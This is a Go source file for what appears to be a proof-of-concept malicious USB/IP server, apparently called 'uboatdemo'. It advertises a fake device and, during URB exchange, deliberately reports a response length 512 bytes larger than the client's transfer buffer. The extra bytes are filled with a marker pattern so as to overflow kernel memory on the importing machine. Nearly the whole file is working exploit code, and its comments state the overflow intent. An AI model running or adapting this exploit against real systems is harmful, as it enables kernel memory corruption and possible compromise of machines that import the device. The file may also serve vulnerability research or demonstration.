package uboatdemo

// https://www.kernel.org/doc/Documentation/usb/usbip_protocol.txt

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"log"
	"net"
)

const (
	USBIP_STATUS_OK = 0
	OP_REQ_DEVLIST  = 0x8005
	OP_REP_DEVLIST  = 0x0005
	OP_REQ_IMPORT   = 0x8003
	OP_REP_IMPORT   = 0x0003

	USBIP_CMD_SUBMIT = 0x00000001
	USBIP_RET_SUBMIT = 0x00000003
	USBIP_CMD_UNLINK = 0x00000002
	USBIP_RET_UNLINK = 0x00000004

	USBIP_MESSAGE_SIZE = 48

	FAKE_DEVICE_PATH = "/sys/fake/dangerous/usbipdemo"
	FAKE_BUS_ID      = "1-1"
	FAKE_VENDOR_ID   = 0xDEAD
	FAKE_PRODUCT_ID  = 0xBEEF

	// emulating USB 2.0 high speed device
	USB_SPEED_HIGH = 3

	// how much to try to overflow
	OVERFLOW_SIZE = 512
)

var (
	URB_DATA_PATTERN, _ = hex.DecodeString("deadc0de")
)

// common header for non-URB messages (coming from userspace)
type usbipHdr struct {
	Version uint16
	CmdCode uint16
	Status  uint32
}

// response to device list request (supports only 1 device for demo)
type devListResp struct {
	Hdr                 usbipHdr
	N                   uint32
	Path                [256]byte
	BusId               [32]byte
	BusNum              uint32
	DevNum              uint32
	Speed               uint32
	IdVendor            uint16
	IdProduct           uint16
	BcdDevice           uint16
	BDeviceClass        byte
	BDeviceSubClass     byte
	BDeviceProtocol     byte
	BConfigurationValue byte
	BNumConfigurations  byte
	BNumInterfaces      byte
	BInterfaceClass     byte
	BInterfaceSubClass  byte
	BInterfaceProtocol  byte
	Padding             byte
}

// response to device import request
type devImportResp struct {
	Hdr                 usbipHdr
	Path                [256]byte
	BusId               [32]byte
	BusNum              uint32
	DevNum              uint32
	Speed               uint32
	IdVendor            uint16
	IdProduct           uint16
	BcdDevice           uint16
	BDeviceClass        byte
	BDeviceSubClass     byte
	BDeviceProtocol     byte
	BConfigurationValue byte
	BNumConfigurations  byte
	BNumInterfaces      byte
}

// common header for URB messages (coming from kernel)
type urbHdr struct {
	CmdCode    uint32
	SeqNum     uint32
	DevId      uint32
	Direction  uint32
	EnpointNum uint32
}

// USBIP_CMD_SUBMIT
type urbCmdSubmit struct {
	Hdr            urbHdr
	TransferFlags  uint32
	TransferBufLen uint32
	StartFrame     uint32
	NumOfPackets   uint32
	Interval       uint32
	Setup          [8]byte
}

// USBIP_RET_SUBMIT
type urbRetSubmit struct {
	Hdr          urbHdr
	Status       uint32
	ActualLen    uint32
	StartFrame   uint32
	NumOfPackets uint32
	ErrorCnt     uint32
	Setup        [8]byte
}

func sendDeviceList(conn net.Conn, hdr *usbipHdr) {
	var resp devListResp

	// pretend to be the same USB/IP version just in case
	resp.Hdr.Version = hdr.Version
	resp.Hdr.CmdCode = OP_REP_DEVLIST
	resp.Hdr.Status = USBIP_STATUS_OK

	// number of devices (always 1)
	resp.N = 1

	copy(resp.Path[:], []byte(FAKE_DEVICE_PATH))
	copy(resp.BusId[:], []byte(FAKE_BUS_ID))
	resp.BusNum = 1
	resp.DevNum = 1

	resp.IdVendor = FAKE_VENDOR_ID
	resp.IdProduct = FAKE_PRODUCT_ID
	resp.Speed = USB_SPEED_HIGH

	respBuf := bytes.NewBuffer(nil)
	err := binary.Write(respBuf, binary.BigEndian, &resp)
	if err != nil {
		log.Println(err)
		conn.Close()
		return
	}

	_, err = conn.Write(respBuf.Bytes())
	if err != nil {
		log.Println(err)
		conn.Close()
		return
	}

	log.Println("sending fake device list")
}

func sendImport(conn net.Conn, hdr *usbipHdr) {
	var resp devImportResp

	// pretend to be the same USB/IP version just in case
	resp.Hdr.Version = hdr.Version
	resp.Hdr.CmdCode = OP_REP_IMPORT
	resp.Hdr.Status = USBIP_STATUS_OK

	copy(resp.Path[:], []byte(FAKE_DEVICE_PATH))
	copy(resp.BusId[:], []byte(FAKE_BUS_ID))
	resp.BusNum = 1
	resp.DevNum = 1

	resp.IdVendor = FAKE_VENDOR_ID
	resp.IdProduct = FAKE_PRODUCT_ID
	resp.Speed = USB_SPEED_HIGH

	respBuf := bytes.NewBuffer(nil)
	err := binary.Write(respBuf, binary.BigEndian, &resp)
	if err != nil {
		log.Println(err)
		return
	}

	_, err = conn.Write(respBuf.Bytes())
	if err != nil {
		log.Println(err)
	}

	log.Println("fake device is being exported")
}

func fillBuf(buf []byte) {
	for i := 0; i < len(buf); i += len(URB_DATA_PATTERN) {
		copy(buf[i:], URB_DATA_PATTERN)
	}
}

type byteWriter struct {
	dst []byte
}

func (b *byteWriter) Write(p []byte) (n int, err error) {
	return copy(b.dst, p), nil
}

func urbExchange(conn net.Conn) {
	buf := make([]byte, 1500)

	for {
		_, err := conn.Read(buf)
		if err != nil {
			log.Println(err)
			conn.Close()
			return
		}

		var submit urbCmdSubmit
		err = binary.Read(bytes.NewReader(buf), binary.BigEndian, &submit.Hdr)
		if err != nil {
			log.Println(err)
			conn.Close()
			return
		}

		// for the purposes of demo we care about submit command only
		if submit.Hdr.CmdCode == USBIP_CMD_SUBMIT {
			// log.Println(hex.EncodeToString(buf[:n]))
			// read the whole structure
			err = binary.Read(bytes.NewReader(buf), binary.BigEndian, &submit)
			if err != nil {
				log.Println(err)
				conn.Close()
				return
			}

			var ret urbRetSubmit
			ret.Hdr.CmdCode = USBIP_RET_SUBMIT
			ret.Hdr.SeqNum = submit.Hdr.SeqNum
			ret.Hdr.DevId = submit.Hdr.DevId
			ret.Hdr.Direction = submit.Hdr.Direction
			ret.Hdr.EnpointNum = submit.Hdr.EnpointNum

			// sending more than the actual buffer can hold
			ret.ActualLen = submit.TransferBufLen + OVERFLOW_SIZE

			err = binary.Write(&byteWriter{buf}, binary.BigEndian, &ret)
			if err != nil {
				log.Println(err)
				conn.Close()
				return
			}

			fillBuf(buf[USBIP_MESSAGE_SIZE:])
			//log.Println(hex.EncodeToString(buf[:USBIP_MESSAGE_SIZE+ret.ActualLen]))

			_, err = conn.Write(buf)
			if err != nil {
				log.Println(err)
			}

			log.Printf("sending %v bytes, but actual buffer is %v bytes", ret.ActualLen, submit.TransferBufLen)
		}
	}
}

func handleConnection(conn net.Conn) {
	buf := make([]byte, 1500)

	for {
		_, err := conn.Read(buf)
		if err != nil {
			log.Println(err)
			conn.Close()
			return
		}

		var hdr usbipHdr
		err = binary.Read(bytes.NewReader(buf), binary.BigEndian, &hdr)
		if err != nil {
			log.Println(err)
			conn.Close()
			return
		}

		if hdr.CmdCode == OP_REQ_DEVLIST {
			sendDeviceList(conn, &hdr)
			conn.Close()
			return
		} else if hdr.CmdCode == OP_REQ_IMPORT {
			sendImport(conn, &hdr)

			// kernel communication begins here
			urbExchange(conn)
			break
		}
	}
}
